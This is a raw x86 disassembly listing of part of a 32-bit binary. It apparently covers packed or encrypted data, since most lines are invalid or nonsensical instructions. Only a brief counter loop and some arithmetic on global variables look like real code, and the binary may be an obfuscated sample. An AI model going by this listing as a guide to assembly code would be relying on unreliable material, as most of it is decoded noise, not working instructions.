  4067ad:	sbb    ebx,DWORD PTR [esi+0x3f]
  4067b0:	inc    edi
  4067b1:	out    0x16,eax
  4067b3:	xchg   ebx,eax
  4067b4:	and    esi,DWORD PTR [edi-0x7e430253]
  4067ba:	dec    ebx
  4067bb:	lahf   
  4067bc:	(bad)  
  4067bf:	pop    ds
  4067c0:	inc    esp
  4067c1:	imul   ecx,DWORD PTR [ebp-0x58c10200],0xffffffbf
  4067c8:	xor    eax,0xa7e7687f
  4067cd:	xor    DWORD PTR [ebx-0x5d76d684],ebp
  4067d3:	pop    ecx
  4067d4:	dec    ecx
  4067d5:	dec    esp
  4067d6:	cmps   DWORD PTR gs:[esi],DWORD PTR es:[edi]
  4067d8:	rol    DWORD PTR [edi-0x5c],1
  4067db:	dec    esp
  4067dc:	mov    gs:0x63050b11,eax
  4067e2:	add    dh,dh
  4067e4:	or     al,0x2b
  4067e6:	push   edi
  4067e7:	js     0x4067fd
  4067e9:	jb     0x4067b5
  4067eb:	mov    ch,0x96
  4067ed:	pop    ss
  4067ee:	xor    ebp,DWORD PTR [edi]
  4067f0:	push   esp
  4067f1:	mov    ds:0x35826ec2,al
  4067f6:	clc    
  4067f7:	fcmovu st,st(3)
  4067f9:	mov    ebp,0x999c4fa2
  4067fe:	inc    ebx
  4067ff:	sub    eax,0x274c347a
  406804:	dec    ecx
  406805:	pop    edi
  406806:	jg     0x40681d
  406808:	mov    ds:0x908252d9,eax
  40680d:	addr16 push ss
  40680f:	mov    esp,0x619e781f
  406814:	pop    ebp
  406815:	push   esi
  406816:	test   DWORD PTR [ecx-0x27fe0d18],ebp
  40681c:	mov    edx,0xa1e85883
  406821:	mov    BYTE PTR [ebx+0x5bde8a6e],dl
  406827:	fdivr  st(4),st
  406829:	clc    
  40682a:	push   0xf4ce01b
  40682f:	mov    dh,BYTE PTR [edx]
  406831:	fldenv [esi]
  406833:	add    eax,0xfe481000
  406838:	fisub  DWORD PTR [eax+0x17de69f]
  40683e:	dec    eax
  40683f:	push   ds
  406840:	pushf  
  406841:	sahf   
  406842:	xchg   esi,eax
  406843:	jae    0x4068ab
  406845:	out    0xce,al
  406847:	retf   
  406848:	mov    eax,0x446cce77
  40684d:	js     0x406888
  40684f:	mov    cl,0x95
  406851:	sub    esp,DWORD PTR [esi]
  406853:	(bad)  
  406854:	add    ch,BYTE PTR [ebp-0x5e]
  406857:	fidivr DWORD PTR fs:[eax]
  40685a:	gs movd mm0,esi
  40685e:	in     al,0xe
  406860:	and    BYTE PTR [ecx+0x21],dh
  406863:	int    0xe4
  406865:	sub    eax,0xa51263ce
  40686a:	outs   dx,BYTE PTR ds:[esi]
  40686b:	pop    ecx
  40686c:	lds    esp,FWORD PTR [ebx-0x5d]
  40686f:	in     eax,dx
  406870:	inc    edx
  406871:	adc    edi,DWORD PTR [eax-0x33]
  406874:	push   ds
  406875:	out    dx,eax
  406876:	fistp  DWORD PTR [edx+0x18eaf2fc]
  40687c:	aad    0x79
  40687e:	add    eax,0xef29d60e
  406883:	pusha  
  406884:	pop    eax
  406885:	(bad)  
  406886:	sub    DWORD PTR [eax+ebx*8-0x68bf45b5],ebx
  40688d:	fmul   DWORD PTR [edx-0x12]
  406890:	(bad)  
  406891:	cld    
  406892:	sub    ah,BYTE PTR [edi+0x3e2168a6]
  406898:	and    al,0x25
  40689a:	add    esp,ebx
  40689c:	repz dec esi
  40689e:	jecxz  0x406905
  4068a0:	sub    cl,BYTE PTR [edx-0x1d]
  4068a3:	jbe    0x4068d9
  4068a5:	dec    ecx
  4068a6:	ins    BYTE PTR es:[edi],dx
  4068a7:	hlt    
  4068a8:	clc    
  4068a9:	aam    0x35
  4068ab:	or     al,0xc8
  4068ad:	(bad)  
  4068ae:	sub    al,0xc8
  4068b0:	push   ebx
  4068b1:	push   ebp
  4068b2:	xlat   BYTE PTR cs:[ebx]
  4068b4:	stos   BYTE PTR es:[edi],al
  4068b5:	sub    eax,0x51e1b269
  4068ba:	nop
  4068bb:	cmp    al,0xf9
  4068bd:	sub    ah,BYTE PTR [ebx-0x15f694ed]
  4068c3:	(bad)  
  4068c4:	iret   
  4068c5:	jecxz  0x4068ad
  4068c7:	les    ecx,FWORD PTR [edx+0x256b22e]
  4068cd:	mov    eax,ds:0xabcf1825
  4068d2:	pop    edi
  4068d3:	jl     0x406932
  4068d5:	ret    0x18
  4068d8:	push   ebp
  4068d9:	mov    ebp,esp
  4068db:	sub    esp,0x58
  4068de:	mov    DWORD PTR ds:0x42a7bd,0x1f
  4068e8:	cmp    DWORD PTR ds:0x42a7bd,0x0
  4068ef:	je     0x406947
  4068f5:	cmp    DWORD PTR ds:0x42a7bd,0x8
  4068fc:	jne    0x406916
  406902:	push   DWORD PTR [ebp-0x1c]
  406905:	push   DWORD PTR [ebp-0x24]
  406908:	push   0x42aaaa
  40690d:	push   DWORD PTR [ebp-0x10]
  406910:	call   DWORD PTR ds:0x41d18c
  406916:	cmp    DWORD PTR ds:0x42a7bd,0x9
  40691d:	jne    0x406931
  406923:	xor    eax,eax
  406925:	or     eax,DWORD PTR ds:0x42a7bd
  40692b:	dec    eax
  40692c:	mov    ds:0x42a7bd,eax
  406931:	mov    eax,ds:0x42a7bd
  406936:	dec    eax
  406937:	mov    ds:0x42a7bd,eax
  40693c:	jmp    0x4068e8
  406941:	and    DWORD PTR ds:0x42a769,edx
  406947:	mov    ecx,DWORD PTR [ebp+0x8]
  40694a:	jmp    0x406c53
  40694f:	int3   
  406950:	(bad)
  406953:	(bad)  
  406955:	fcmove st,st(1)
  406957:	in     eax,dx
  406958:	loop   0x406947
  40695a:	out    dx,eax
  40695b:	mov    cl,BYTE PTR [ebp-0x36ff11af]
  406961:	js     0x4069db
  406963:	fs jle 0x4069de
  406966:	js     0x406929
  406968:	push   eax
  406969:	xchg   edi,eax
  40696a:	dec    edi
  40696b:	sub    ecx,DWORD PTR [esi]
  40696d:	xor    al,0x5f
  40696f:	lods   eax,DWORD PTR ds:[esi]
  406970:	xor    ch,bl
  406972:	out    0x29,al
  406974:	push   0x43
  406976:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406977:	jne    0x4069f0
  406979:	icebp  
  40697a:	dec    esi
  40697b:	sbb    eax,0x6923c9d2
  406980:	pop    ss
  406981:	loop   0x406935
  406983:	pop    ebx
  406984:	lahf   
  406985:	(bad)  
  406986:	and    esp,eax
  406988:	sub    al,0x11
  40698a:	out    0xc4,al
  40698c:	sub    ah,dh
  40698e:	lods   al,BYTE PTR ds:[esi]
  40698f:	dec    esp
  406990:	imul   esp,DWORD PTR [edx+0x21],0xc
  406994:	add    BYTE PTR [ecx],0x5c
  406997:	and    DWORD PTR [esi+0x19],0x5f3fc848
  40699e:	test   BYTE PTR [esi-0x669bf662],dh
  4069a4:	fsubrp st(0),st
  4069a6:	inc    edi
  4069a7:	pop    eax
  4069a8:	mov    WORD PTR [edi+edi*4-0x4a],ds
  4069ac:	fwait
  4069ad:	sbb    eax,0x332ae453
  4069b2:	loopne 0x406967
  4069b4:	mov    ah,0xe6
  4069b6:	sub    al,0x5f
  4069b8:	or     BYTE PTR [ecx+0x59b3d583],al
  4069be:	pop    esp
  4069bf:	repnz das 
  4069c1:	xchg   ebp,eax
  4069c2:	scas   al,BYTE PTR es:[edi]
  4069c3:	jmp    0x2c1:0x2ecfa74a
  4069ca:	and    al,0x6d
  4069cc:	imul   ebp,DWORD PTR [esi+0x64651acf],0x1f
  4069d3:	sub    BYTE PTR [esi+edi*1],dl
  4069d6:	enter  0x65b0,0x60
  4069da:	out    dx,al
  4069db:	push   ebx
  4069dc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4069dd:	into   
  4069de:	mov    WORD PTR [edx+0x7de08e9b],?
  4069e4:	cdq    
  4069e5:	not    BYTE PTR [ebx-0xf]
  4069e8:	out    0xb9,al
  4069ea:	mov    edx,0x48387cd5
  4069ef:	test   DWORD PTR [edx+0x2996c4ac],esi
  4069f5:	mul    DWORD PTR [ecx]
  4069f7:	sbb    dh,BYTE PTR [edi-0x329fa630]
  4069fd:	outs   dx,BYTE PTR ds:[esi]
  4069fe:	enter  0x6d20,0xf9
  406a02:	and    al,0x4d
  406a04:	inc    ebp
  406a05:	fs (bad) 
  406a07:	in     eax,0x78
  406a09:	mov    ecx,esi
  406a0b:	stc    
  406a0c:	outs   dx,DWORD PTR ds:[esi]
  406a0d:	inc    eax
  406a0e:	les    ecx,FWORD PTR [edx+0x7ab40a3e]
  406a14:	inc    eax
  406a15:	inc    BYTE PTR [ebx]
  406a17:	mov    esp,0xbddfc46f
  406a1c:	jl     0x4069cb
  406a1e:	add    eax,0x2aa568d7
  406a23:	ret    
  406a24:	cmp    eax,0x83c26572
  406a29:	inc    ebp
  406a2a:	dec    edx
  406a2b:	jne    0x4069d3
  406a2d:	gs jp  0x406a2a
  406a30:	add    BYTE PTR [ebx],0x4d
  406a33:	aam    0xa0
  406a35:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406a36:	mov    bl,0xfc
  406a38:	mov    eax,ds:0x7317c6b6
  406a3d:	or     cl,cl
  406a3f:	add    BYTE PTR [edx],dl
  406a41:	push   DWORD PTR [edi]
  406a43:	ins    DWORD PTR es:[edi],dx
  406a44:	xchg   edi,eax
  406a45:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406a46:	dec    ebp
  406a47:	dec    ebp
  406a48:	or     dl,bl
  406a4a:	sub    bl,ah
  406a4c:	sub    al,0x41
  406a4e:	sbb    eax,0xfffffff6
  406a51:	pop    ebp
  406a52:	dec    edi
  406a53:	stos   BYTE PTR es:[edi],al
  406a54:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406a55:	outs   dx,BYTE PTR ds:[esi]
  406a56:	add    DWORD PTR [edx-0x12],edx
  406a59:	lahf   
  406a5a:	xchg   ecx,eax
  406a5b:	mov    ds:0x4cf13d8e,al
  406a60:	cmp    dl,BYTE PTR [ebx]
  406a62:	mov    ecx,0x4c3d9362
  406a67:	in     al,dx
  406a68:	dec    ebp
  406a69:	jmp    DWORD PTR [ebx]
  406a6b:	cmp    ecx,edi
  406a6d:	aas    
  406a6e:	popf   
  406a6f:	and    eax,0xb2961bff
  406a74:	push   0xffffffa3
  406a76:	fadd   st,st(4)
  406a78:	ins    DWORD PTR es:[edi],dx
  406a79:	inc    ecx
  406a7a:	push   ss
  406a7b:	jp     0x406abb
  406a7d:	jae    0x406a9a
  406a7f:	lea    ebx,[edx]
  406a81:	in     al,0xa6
  406a83:	pop    ebp
  406a84:	sub    cl,BYTE PTR [ebx]
  406a86:	dec    edi
  406a87:	mov    edx,0x5526b71e
  406a8c:	inc    edi
  406a8d:	loopne 0x406b05
  406a8f:	sbb    bh,BYTE PTR [esi-0x2a]
  406a92:	push   0xbe4c2137
  406a97:	inc    eax
  406a98:	xchg   edx,eax
  406a99:	xor    eax,0x5c3b96a0
  406a9e:	or     eax,edx
  406aa0:	inc    esp
  406aa1:	xchg   ecx,eax
  406aa2:	dec    ebp
  406aa3:	mov    al,0x81
  406aa5:	push   edx
  406aa6:	stc    
  406aa7:	rcr    DWORD PTR [eax-0x3f],0xb9
  406aab:	mov    edx,0x497224f9
  406ab0:	pushf  
  406ab1:	(bad)  
  406ab2:	cwde   
  406ab3:	or     BYTE PTR [edi+0x154d4a19],al
  406ab9:	cld    
  406aba:	jmp    0x406b14
  406abc:	mov    al,ds:0x696362fc
  406ac1:	dec    edi
  406ac2:	add    ch,BYTE PTR [ebp-0x52]
  406ac5:	in     al,0x3f
  406ac7:	add    DWORD PTR [eax+0x377b1cc9],ecx
  406acd:	jae    0x406a83
  406acf:	xor    BYTE PTR [eax],bl
  406ad1:	rcl    BYTE PTR [esi+0x49803e4b],1
  406ad7:	or     ah,BYTE PTR [edi+0x3dae4f5d]
  406add:	bnd call 0x47c29c6
  406ae3:	lock add DWORD PTR [edx-0x7c],ebp
  406ae7:	lds    eax,FWORD PTR [ebx]
  406ae9:	jmp    0x406abf
  406aeb:	ins    BYTE PTR es:[edi],dx
  406aec:	into   
  406aed:	push   ds
  406aee:	mov    ds:0xc35d21a9,eax
  406af3:	fcmovnbe st,st(0)
  406af5:	or     DWORD PTR ds:0x881829b8,esp
  406afb:	pop    ss
  406afc:	mov    esi,edx
  406afe:	sar    DWORD PTR [edi+0x59],1
  406b01:	xchg   ebx,eax
  406b02:	dec    ebx
  406b03:	or     al,0xf6
  406b05:	push   cs
  406b06:	enter  0x3469,0xc8
  406b0a:	and    DWORD PTR [ecx-0x38],ecx
  406b0d:	add    ebx,DWORD PTR [ebx]
  406b0f:	test   BYTE PTR [ebp+eax*4-0x15b31232],dl
  406b16:	inc    esi
  406b17:	sub    DWORD PTR [edx],ecx
  406b19:	(bad)  
  406b1a:	ffree  st(0)
  406b1c:	lods   eax,DWORD PTR ds:[esi]
  406b1d:	push   ebp
  406b1e:	push   ss
  406b1f:	jle    0x406ad8
  406b21:	mov    cl,BYTE PTR [esi+edx*4+0x39]
  406b25:	sbb    al,0x96
  406b27:	(bad)  
  406b28:	call   0xf115:0x13566
  406b2f:	enter  0x4ba4,0x44
  406b33:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406b34:	push   esp
  406b35:	xchg   edi,eax
  406b36:	(bad)  
  406b37:	fdivrp st(6),st
  406b39:	loopne 0x406ad0
  406b3b:	ins    BYTE PTR es:[edi],dx
  406b3c:	inc    esp
  406b3d:	push   eax
  406b3e:	in     al,0x66
  406b40:	inc    eax
  406b41:	jne    0x406aff
  406b43:	gs xchg edi,eax
  406b45:	inc    esp
  406b46:	jnp    0x406b6d
  406b48:	xchg   edx,eax
  406b49:	fbld   TBYTE PTR [eax]
  406b4b:	lods   al,BYTE PTR ds:[esi]
  406b4c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406b4d:	cli    
  406b4e:	jae    0x406b5c
  406b50:	ficomp WORD PTR [esi]
  406b52:	mov    ds:0x71f0a4b6,al
  406b57:	adc    dl,BYTE PTR [ecx-0x1b]
  406b5a:	out    dx,al
  406b5b:	jo     0x406ba1
  406b5d:	fnsave ds:0x408a7d58
  406b63:	add    al,0x4c
  406b65:	hlt    
  406b66:	cmp    al,0x2f
  406b68:	cmp    edi,DWORD PTR [eax+0x3e965a1a]
  406b6e:	test   BYTE PTR [eax+0x18],cl
  406b71:	sub    eax,0x862751c1
  406b76:	mov    cl,0x57
  406b78:	pop    ds
  406b79:	cmp    eax,0xe24dc27
  406b7e:	sbb    DWORD PTR ds:0xb5da1f3c,edi
  406b84:	push   ebp
  406b85:	test   ebp,ecx
  406b87:	inc    esp
  406b88:	(bad)  
  406b89:	stc    
  406b8a:	shl    BYTE PTR [ebp-0x3f],0x8d
  406b8e:	sub    BYTE PTR [eax-0x3217619b],0x9b
  406b95:	push   ecx
  406b96:	jmp    0x1861:0xcae87ac3
  406b9d:	push   ecx
  406b9e:	adc    dh,BYTE PTR [esp+ebx*2+0x680be2d7]
  406ba5:	fadd   QWORD PTR [edx+0x3294faa7]
  406bab:	jge    0x406b6e
  406bad:	pop    edx
  406bae:	jmp    0xdbc4:0xc5c9e2ae
  406bb5:	ja     0x406bf1
  406bb7:	call   0xb87a:0x117b9c09
  406bbe:	ror    esp,0xf1
  406bc1:	aaa    
  406bc2:	adc    DWORD PTR [esi-0x29bfd025],esp
  406bc8:	pop    eax
  406bc9:	call   0x6a3f036d
  406bce:	xor    dl,dl
  406bd0:	test   BYTE PTR [ebx+ecx*1-0x48617dc],ah
  406bd7:	pop    ds
  406bd8:	cmc    
  406bd9:	push   0x31
  406bdb:	or     DWORD PTR [edi+0xe],0xffffffb4
  406bdf:	jae    0x406b80
  406be1:	xchg   dl,ch
  406be3:	sub    BYTE PTR [esi+0x37],ch
  406be6:	jne    0x406c1e
  406be8:	sub    eax,0xea0f2a20
  406bed:	sbb    al,0xc1
  406bef:	jmp    FWORD PTR ds:0x1712d129
  406bf5:	jmp    0x406b8e
  406bf7:	fcmovb st,st(0)
  406bf9:	sbb    DWORD PTR [ecx-0x43],ebx
  406bfc:	xchg   ebx,eax
  406bfd:	pop    ecx
  406bff:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406c00:	cdq    
  406c01:	das    
  406c02:	add    al,cl
  406c04:	dec    ebx
  406c05:	add    al,0x2e
  406c07:	aas    
  406c08:	ins    DWORD PTR es:[edi],dx
  406c09:	pop    ss
  406c0a:	aaa    
  406c0b:	push   ebx
  406c0c:	cli    
  406c0d:	add    bl,ah
  406c0f:	inc    edx
  406c10:	jbe    0x406be7
  406c12:	in     al,0xb6
  406c14:	test   DWORD PTR [edi],esp
  406c16:	push   ecx
  406c17:	ja     0x406bd8
  406c19:	mov    esp,esi
  406c1b:	int    0x5d
  406c1d:	test   DWORD PTR [esp+edx*4-0x3f7c12a8],0xa0684139
  406c28:	jle    0x406bd3
  406c2a:	sbb    dh,ch
  406c2c:	daa    
  406c2d:	push   es
  406c2e:	and    edi,DWORD PTR [eax-0x7b53205e]
  406c34:	mov    eax,0x3a865677
  406c39:	std    
  406c3a:	shl    BYTE PTR [eax+0xe],cl
  406c3d:	mov    ch,0x40
  406c3f:	(bad)  
  406c40:	push   0xffffff84
  406c42:	pop    ecx
  406c43:	mov    cl,0xf2
  406c45:	push   0xffffff80
  406c47:	inc    ebx
  406c48:	push   esi
  406c49:	es ins DWORD PTR es:[edi],dx
  406c4b:	or     ch,BYTE PTR [ecx+eax*4-0x12e10e0e]
  406c52:	fs mov eax,0x8a36
  406c58:	adc    DWORD PTR ds:0x42a7c9,0x4fea
  406c62:	xor    ax,WORD PTR [ecx+0x20]
  406c66:	sub    DWORD PTR ds:0x42a7f5,0x417a
  406c70:	mov    ecx,0x3afc
  406c75:	xor    DWORD PTR ds:0x42a84d,0x2c9d
  406c7f:	jmp    0x406f88
  406c84:	rol    dh,cl
  406c86:	cmp    al,0xd3
  406c88:	aam    0xd9
  406c8a:	rol    ebp,1
  406c8c:	mov    eax,ebx
  406c8e:	and    DWORD PTR [ecx-0x57],ebx
  406c91:	sub    dh,BYTE PTR [ecx]
  406c93:	xchg   DWORD PTR [edi+ecx*8+0x78],ebp
  406c97:	js     0x406cfd
  406c99:	jle    0x406d13
  406c9b:	js     0x406caa
  406c9d:	rcr    DWORD PTR [edi+0x7c],1
  406ca0:	pushf  
  406ca1:	scas   al,BYTE PTR es:[edi]
  406ca2:	outs   dx,DWORD PTR ds:[esi]
  406ca3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406ca4:	scas   al,BYTE PTR es:[edi]
  406ca5:	dec    esi
  406ca6:	adc    eax,0xb92555de
  406cab:	cli    
  406cac:	les    eax,FWORD PTR [edx-0x62f86d67]
  406cb2:	mov    edi,0x4052d141
  406cb7:	retf   
  406cb8:	sbb    cl,ah
  406cba:	jle    0x406d1d
  406cbc:	xor    esi,DWORD PTR [edx+0x46]
  406cbf:	popa   
  406cc0:	es pop edx
  406cc2:	inc    ebx
  406cc3:	imul   ebx,DWORD PTR [eax],0x6767f18f
  406cc9:	retf   0x5445
  406ccc:	mov    ds:0xdb3284e4,al
  406cd1:	call   DWORD PTR [esi]
  406cd3:	fnsave [ebx+edx*1-0x30]
  406cd7:	call   ecx
  406cd9:	sub    ecx,ecx
  406cdb:	and    eax,0x612d91a3
  406ce0:	jmp    FWORD PTR ds:0x2947e203
  406ce6:	mov    esp,0x87c0d556
  406ceb:	add    al,0x41
  406ced:	and    DWORD PTR [edi-0x4],0x7226cdd0
  406cf4:	inc    ebp
  406cf5:	dec    ebx
  406cf6:	out    dx,eax
  406cf7:	test   BYTE PTR [edi-0xc],ah
  406cfa:	dec    eax
  406cfb:	(bad)  
  406cfc:	in     al,0xf1
  406cfe:	bnd jns 0x406cfb
  406d01:	push   ebp
  406d02:	ds cmp eax,0x290498f7
  406d08:	dec    edx
  406d09:	sub    eax,0xce7a530c
  406d0e:	sub    DWORD PTR [edi],ecx
  406d10:	ret    
  406d11:	add    al,0xd7
  406d13:	leave  
  406d14:	call   0x5e775f33
  406d19:	jg     0x406d2a
  406d1b:	and    cl,al
  406d1d:	or     eax,esp
  406d1f:	pop    esi
  406d20:	sbb    BYTE PTR [ebp+edx*2-0x89079ce],al
  406d27:	mov    ah,0x32
  406d29:	sbb    al,0xe5
  406d2b:	ja     0x406cdc
  406d2d:	pushf  
  406d2e:	jecxz  0x406d7a
  406d30:	push   ebp
  406d31:	test   BYTE PTR [esi],ah
  406d33:	(bad)  
  406d34:	stos   DWORD PTR es:[edi],eax
  406d35:	mov    ah,0x72
  406d37:	adc    esp,ebp
  406d39:	popa   
  406d3a:	cmp    DWORD PTR [edi+0x10],eax
  406d3d:	push   ds
  406d3e:	pop    ecx
  406d3f:	sbb    ebp,DWORD PTR [ecx+0x22]
  406d42:	pop    eax
  406d43:	stos   DWORD PTR es:[edi],eax
  406d44:	hlt    
  406d45:	sub    DWORD PTR [ecx-0x6473e513],ecx
  406d4b:	ret    0xe2f8
  406d4e:	aas    
  406d4f:	xchg   eax,ebp
  406d51:	in     eax,dx
  406d52:	or     edi,DWORD PTR gs:[esi+0x6de5b79b]
  406d59:	mov    ah,0xfa
  406d5b:	out    dx,eax
  406d5c:	lods   al,BYTE PTR ds:[esi]
  406d5d:	jmp    0x406da1
  406d5f:	(bad)  
  406d60:	push   ss
  406d61:	sahf   
  406d62:	push   esi
  406d63:	into   
  406d64:	shl    DWORD PTR [edx],cl
  406d66:	pop    ds
  406d67:	into   
  406d68:	rol    eax,cl
  406d6a:	xchg   esp,eax
  406d6b:	shr    ecx,cl
  406d6d:	cmp    DWORD PTR [esi-0x2aacf033],esi
  406d73:	mov    eax,ds:0x9fa604
  406d78:	sbb    al,0x3b
  406d7a:	stos   BYTE PTR es:[edi],al
  406d7b:	xchg   edi,eax
  406d7c:	scas   eax,DWORD PTR es:[edi]
  406d7d:	jp     0x406dae
  406d7f:	into   
  406d80:	icebp  
  406d81:	adc    al,0x20
  406d83:	out    dx,al
  406d84:	int3   
  406d85:	jb     0x406dee
  406d87:	jge    0x406d80
  406d89:	dec    ebx
  406d8a:	inc    edx
  406d8b:	nop
  406d8c:	dec    ebx
  406d8d:	xor    BYTE PTR ds:0x3bdf93c1,al
  406d93:	imul   esi,DWORD PTR [ebp+0x6c7f651a],0x9865cc09
  406d9d:	adc    DWORD PTR [edx-0x733f68cb],ebx
  406da3:	jno    0x406e1c
  406da5:	arpl   WORD PTR [ebp-0x3a],sp
  406da8:	sub    BYTE PTR [edi],dh
  406daa:	adc    BYTE PTR [ecx+0x5b5293c8],dh
  406db0:	xor    DWORD PTR [eax],0xfcda26a0
  406db6:	jg     0x406e26
  406db8:	adc    eax,0x8b550f14
  406dbe:	xor    eax,0x37fc8dee
  406dc3:	(bad)  
  406dc4:	pop    edx
  406dc5:	pop    ds
  406dc6:	adc    DWORD PTR [ecx+0x498ea19a],eax
  406dcc:	pcmpgtb mm4,mm4
  406dcf:	sub    eax,0xe2c553b5
  406dd4:	mov    esp,DWORD PTR [edx-0x786998ab]
  406dda:	add    esp,ebp
  406ddc:	jmp    0x406ddf
  406dde:	and    bh,BYTE PTR [ecx+0x58]
  406de1:	outs   dx,DWORD PTR ds:[esi]
  406de2:	lock (bad) 
  406de4:	shl    DWORD PTR [edx+eax*4],cl
  406de7:	sahf   
  406de8:	jo     0x406e34
  406dea:	pusha  
  406deb:	push   edi
  406dec:	addr16 (bad) 
  406dee:	lods   eax,DWORD PTR ds:[esi]
  406def:	js     0x406dee
  406df1:	in     al,0x88
  406df3:	sub    DWORD PTR [esi+0x25],ebx
  406df6:	lods   eax,DWORD PTR ds:[esi]
  406df7:	call   0xd10b2fbc
  406dfc:	push   cs
  406dfd:	ss xor dl,0xc0
  406e01:	inc    eax
  406e02:	and    al,0x93
  406e04:	push   0x46
  406e06:	aam    0xb
  406e08:	mov    edi,0xcf376b4a
  406e0d:	push   esp
  406e0e:	pop    es
  406e0f:	test   eax,0xb87fcc20
  406e14:	push   esp
  406e15:	jnp    0x406dfa
  406e17:	xchg   esp,eax
  406e18:	test   al,0xc6
  406e1a:	or     al,0xc2
  406e1c:	cli    
  406e1d:	adc    dh,BYTE PTR [ebp+ecx*1+0xaf4c85d]
  406e24:	xchg   DWORD PTR [ecx+0x56],edx
  406e27:	jo     0x406e86
  406e29:	mov    ebx,0xa1125b63
  406e2e:	cmp    eax,0x839e1c19
  406e33:	inc    esi
  406e34:	push   0x36
  406e36:	sub    esi,DWORD PTR [edx+0x6]
  406e39:	jae    0x406e6b
  406e3b:	retf   0x714f
  406e3e:	sbb    eax,0xc1bdfa34
  406e43:	mov    DWORD PTR [ebx+0x3df433f1],edx
  406e49:	cs leave 
  406e4b:	addr16 test al,0xc2
  406e4e:	pushf  
  406e4f:	push   eax
  406e50:	aas    
  406e51:	hlt    
  406e52:	jne    0x406ec1
  406e54:	je     0x406e3d
  406e56:	xchg   edi,eax
  406e57:	mov    ecx,0xe16a044a
  406e5c:	push   0xcb845b51
  406e61:	or     DWORD PTR [ebp+ecx*2-0x4d],0x5e
  406e66:	aaa    
  406e67:	addr16 mov ch,0x67
  406e6a:	xor    BYTE PTR [edx],ah
  406e6c:	sar    BYTE PTR [edx],0xce
  406e6f:	outs   dx,BYTE PTR ds:[esi]
  406e70:	mov    bh,0xf4
  406e72:	pop    ebp
  406e73:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406e74:	mov    al,0x72
  406e76:	mov    ebp,0xafa1a99f
  406e7b:	lahf   
  406e7c:	jmp    0x668b:0x48a4c0d8
  406e83:	sbb    eax,0xc419f2c3
  406e88:	lods   eax,DWORD PTR ds:[esi]
  406e89:	mov    ebx,0x84d64392
  406e8e:	(bad)  
  406e8f:	lods   al,BYTE PTR ds:[esi]
  406e90:	pop    ss
  406e91:	test   ecx,ecx
  406e93:	mov    eax,0x99c685f0
  406e98:	stc    
  406e99:	call   0x4779:0x7ce5282e
  406ea0:	stos   DWORD PTR es:[edi],eax
  406ea1:	retf   0x1778
  406ea4:	iret   
  406ea5:	cmc    
  406ea6:	dec    ecx
  406ea7:	retf   
  406ea8:	cmp    eax,0xa756d59c
  406ead:	xchg   esp,eax
  406eae:	shr    DWORD PTR [esi-0x5b1647b5],cl
  406eb4:	jo     0x406ebd
  406eb6:	jno    0x406ef2
  406eb8:	pop    ss
  406eb9:	clc    
  406eba:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406ebb:	out    0x55,eax
  406ebd:	in     eax,dx
  406ebe:	mov    esp,0x3f6a4344
  406ec3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406ec4:	sbb    DWORD PTR [edi+0xc],eax
  406ec7:	repnz lds ecx,FWORD PTR [esi]
  406eca:	pop    edi
  406ecb:	not    al
  406ecd:	inc    eax
  406ece:	pop    ebx
  406ecf:	or     ch,BYTE PTR [ebx]
  406ed1:	js     0x406ee0
  406ed3:	stos   BYTE PTR es:[edi],al
  406ed4:	ins    BYTE PTR es:[edi],dx
  406ed5:	cmp    edi,ecx
  406ed7:	jp     0x406ef8
  406ed9:	je     0x406f28
  406edb:	dec    ebp
  406edc:	jle    0x406f43
  406ede:	dec    esp
  406edf:	ja     0x406e7a
  406ee1:	cwde   
  406ee2:	xchg   ebx,eax
  406ee3:	outs   dx,DWORD PTR ds:[esi]
  406ee4:	shl    DWORD PTR [eax],1
  406ee6:	pop    es
  406ee7:	test   BYTE PTR [eax-0x5d],ah
  406eea:	into   
  406eeb:	sub    BYTE PTR [esi-0x7f7fa6e4],0x84
  406ef2:	push   esi
  406ef3:	mov    ch,0xf3
  406ef5:	ss ja  0x406e7d
  406ef8:	mov    edi,0x85b36d2b
  406efd:	xchg   edi,eax
  406efe:	sbb    edx,esp
  406f00:	or     esi,DWORD PTR [edi-0x4c]
  406f03:	mov    esp,0x95540e1b
  406f08:	es add al,0x90
  406f0b:	inc    esp
  406f0c:	jns    0x406f80
  406f0e:	xchg   ebx,eax
  406f0f:	(bad)  
  406f11:	popa   
  406f12:	stos   DWORD PTR es:[edi],eax
  406f13:	xchg   esp,eax
  406f14:	mov    dh,0x3c
  406f16:	sub    eax,0x358f5432
  406f1b:	das    
  406f1c:	xchg   edi,eax
  406f1d:	es cli 
  406f1f:	pop    edi
  406f20:	daa    
  406f21:	xor    dl,BYTE PTR [edx+0x69]
  406f24:	push   0x3c
  406f26:	clc    
  406f27:	mov    ds:0xa3e19ffa,eax
  406f2c:	aaa    
  406f2d:	add    al,0xb
  406f2f:	xchg   bh,bh
  406f31:	pop    ebx
  406f32:	inc    esi
  406f33:	adc    ebx,edi
  406f35:	sub    ebp,DWORD PTR [ebx+0x3feaebfb]
  406f3b:	jecxz  0x406f4e
  406f3d:	xchg   edi,eax
  406f3e:	in     eax,0xca
  406f40:	les    ebx,FWORD PTR [ebx]
  406f42:	push   ebx
  406f43:	jmp    0x47a3:0xf401bd43
  406f4a:	test   al,0x89
  406f4c:	rol    DWORD PTR ds:[esi+0x52],0xa1
  406f51:	dec    edx
  406f52:	cld    
  406f53:	pop    edi
  406f54:	pop    ebp
  406f55:	dec    edx
  406f56:	sti    
  406f57:	xchg   edx,eax
  406f58:	test   eax,edx
  406f5a:	loope  0x406ef1
  406f5c:	sub    BYTE PTR [ebx],cl
  406f5e:	ret    0x594a
  406f61:	pop    eax
  406f62:	aad    0x5d
  406f64:	iret   
  406f65:	add    BYTE PTR [edx-0x5053fcd9],0x2d
  406f6c:	icebp  
  406f6d:	sbb    esi,DWORD PTR [esi]
  406f6f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406f70:	mov    cl,BYTE PTR [ebx+0x3caf0c]
  406f76:	xchg   ecx,eax
